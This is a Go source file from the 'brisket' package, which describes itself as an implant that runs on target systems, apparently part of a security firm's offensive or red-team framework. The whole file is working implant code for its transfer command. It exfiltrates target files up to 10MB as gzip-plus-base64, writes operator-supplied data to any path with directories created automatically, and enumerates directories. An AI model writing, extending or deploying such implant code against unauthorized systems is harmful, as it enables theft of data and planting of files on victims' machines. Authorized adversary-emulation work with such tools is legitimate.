// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package brisket implements the implant/agent that runs on target systems.
package brisket

import (
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"
)

// TransferResult represents the result of a file transfer operation.
type TransferResult struct {
	Success   bool    `json:"success"`
	Operation string  `json:"operation"` // upload, download, list
	Path      string  `json:"path"`
	Size      int64   `json:"size"`
	Checksum  string  `json:"checksum,omitempty"` // SHA256
	Error     string  `json:"error,omitempty"`
	Duration  float64 `json:"duration_ms"`

	// For download operations, contains the file data
	Data string `json:"data,omitempty"` // Base64 + gzip encoded

	// For list operations
	Files []FileInfo `json:"files,omitempty"`
}

// FileInfo represents information about a file.
type FileInfo struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	Size    int64  `json:"size"`
	Mode    string `json:"mode"`
	ModTime string `json:"mod_time"`
	IsDir   bool   `json:"is_dir"`
}

// MaxTransferSize is the maximum file size for transfer (10MB).
const MaxTransferSize = 10 * 1024 * 1024

// Transfer handles file transfer operations.
func (a *Agent) Transfer(args []string) *TransferResult {
	start := time.Now()
	result := &TransferResult{}

	if len(args) == 0 {
		result.Error = "usage: transfer <upload|download|list> <path> [data]"
		result.Duration = float64(time.Since(start).Milliseconds())
		return result
	}

	operation := args[0]
	result.Operation = operation

	switch operation {
	case "download":
		if len(args) < 2 {
			result.Error = "usage: transfer download <remote_path>"
			break
		}
		a.downloadFile(args[1], result)

	case "upload":
		if len(args) < 3 {
			result.Error = "usage: transfer upload <remote_path> <base64_data>"
			break
		}
		a.uploadFile(args[1], args[2], result)

	case "list":
		path := "."
		if len(args) >= 2 {
			path = args[1]
		}
		a.listFiles(path, result)

	default:
		result.Error = fmt.Sprintf("unknown operation: %s (use: download, upload, list)", operation)
	}

	result.Duration = float64(time.Since(start).Milliseconds())
	return result
}

// downloadFile reads a file and returns it base64+gzip encoded.
func (a *Agent) downloadFile(path string, result *TransferResult) {
	result.Path = path

	info, err := os.Stat(path)
	if err != nil {
		result.Error = fmt.Sprintf("file not found: %v", err)
		return
	}

	if info.IsDir() {
		result.Error = "cannot download directory, use 'list' to explore"
		return
	}

	if info.Size() > MaxTransferSize {
		result.Error = fmt.Sprintf("file too large: %d bytes (max %d)", info.Size(), MaxTransferSize)
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		result.Error = fmt.Sprintf("failed to read file: %v", err)
		return
	}

	compressed, err := compressData(data)
	if err != nil {
		result.Error = fmt.Sprintf("failed to compress: %v", err)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(compressed)

	result.Success = true
	result.Size = info.Size()
	result.Data = encoded
}

// uploadFile writes base64+gzip encoded data to a file.
func (a *Agent) uploadFile(path, encodedData string, result *TransferResult) {
	result.Path = path

	compressed, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		result.Error = fmt.Sprintf("failed to decode base64: %v", err)
		return
	}

	data, err := decompressData(compressed)
	if err != nil {
		result.Error = fmt.Sprintf("failed to decompress: %v", err)
		return
	}

	// Create parent directories if needed
	dir := filepath.Dir(path)
	if dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			result.Error = fmt.Sprintf("failed to create directory: %v", err)
			return
		}
	}

	if err := os.WriteFile(path, data, 0o644); err != nil {
		result.Error = fmt.Sprintf("failed to write file: %v", err)
		return
	}

	result.Success = true
	result.Size = int64(len(data))
}

// listFiles returns information about files in a directory.
func (a *Agent) listFiles(path string, result *TransferResult) {
	result.Path = path
	result.Files = []FileInfo{}

	info, err := os.Stat(path)
	if err != nil {
		result.Error = fmt.Sprintf("path not found: %v", err)
		return
	}

	if !info.IsDir() {
		result.Files = append(result.Files, FileInfo{
			Name:    info.Name(),
			Path:    path,
			Size:    info.Size(),
			Mode:    info.Mode().String(),
			ModTime: info.ModTime().Format(time.RFC3339),
			IsDir:   false,
		})
		result.Success = true
		return
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		result.Error = fmt.Sprintf("failed to read directory: %v", err)
		return
	}

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		fullPath := filepath.Join(path, entry.Name())
		result.Files = append(result.Files, FileInfo{
			Name:    entry.Name(),
			Path:    fullPath,
			Size:    info.Size(),
			Mode:    info.Mode().String(),
			ModTime: info.ModTime().Format(time.RFC3339),
			IsDir:   entry.IsDir(),
		})
	}

	result.Success = true
}

// compressData compresses data using gzip.
func compressData(data []byte) ([]byte, error) {
	var buf []byte
	w := gzip.NewWriter(writerFunc(func(p []byte) (int, error) {
		buf = append(buf, p...)
		return len(p), nil
	}))

	if _, err := w.Write(data); err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}

	return buf, nil
}

// decompressData decompresses gzip data.
func decompressData(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(readerFunc(func(p []byte) (int, error) {
		n := copy(p, data)
		data = data[n:]
		if n == 0 {
			return 0, io.EOF
		}
		return n, nil
	}))
	if err != nil {
		return nil, err
	}
	defer r.Close()

	return io.ReadAll(r)
}

// writerFunc is a helper type that implements io.Writer.
type writerFunc func(p []byte) (int, error)

func (f writerFunc) Write(p []byte) (int, error) {
	return f(p)
}

// readerFunc is a helper type that implements io.Reader.
type readerFunc func(p []byte) (int, error)

func (f readerFunc) Read(p []byte) (int, error) {
	return f(p)
}

// MarshalTransferResult serializes a TransferResult to JSON.
func (r *TransferResult) Marshal() ([]byte, error) {
	return json.Marshal(r)
}
